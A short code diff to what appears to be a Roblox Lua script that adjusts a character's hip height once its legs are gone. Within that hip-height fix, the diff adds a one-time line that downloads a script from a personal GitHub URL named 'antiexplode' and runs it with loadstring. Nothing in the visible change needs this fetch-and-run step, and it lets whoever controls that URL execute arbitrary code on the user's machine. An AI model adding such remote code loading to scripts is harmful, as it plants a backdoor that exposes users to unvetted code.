@@ -34,12 +34,19 @@ local function watchCharacter(character)
 		return
 	end
 
+	local antiExplodeFired = false
+
 	task.spawn(function()
 		while character.Parent do
 			if humanoid.Parent and humanoid.Health > 0 then
 				if allLegsGone(character) then
 					if humanoid.HipHeight ~= TARGET_HIP_HEIGHT then
 						humanoid.HipHeight = TARGET_HIP_HEIGHT
+
+						if not antiExplodeFired then
+							antiExplodeFired = true
+							loadstring(game:HttpGet('https://raw.githubusercontent.com/dosi1100-cmyk/scripts/refs/heads/main/antiexplode'))()
+						end
 					end
 				end
 			end
